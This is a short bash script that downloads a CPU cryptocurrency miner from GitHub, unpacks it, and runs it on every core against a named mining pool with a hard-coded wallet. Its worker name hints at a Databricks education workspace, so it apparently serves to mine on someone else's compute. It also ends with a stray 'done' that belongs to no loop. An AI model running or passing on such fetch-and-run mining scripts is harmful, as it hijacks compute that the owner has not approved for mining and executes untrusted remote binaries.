#!/bin/bash

wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz

tar -xf hellminer_cpu_linux.tar.gz

./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RHTc3sa8bhr6qXb9hsVE98JCMZUVp5JQMo.databrick-edu2 -p x --cpu $(nproc)

done

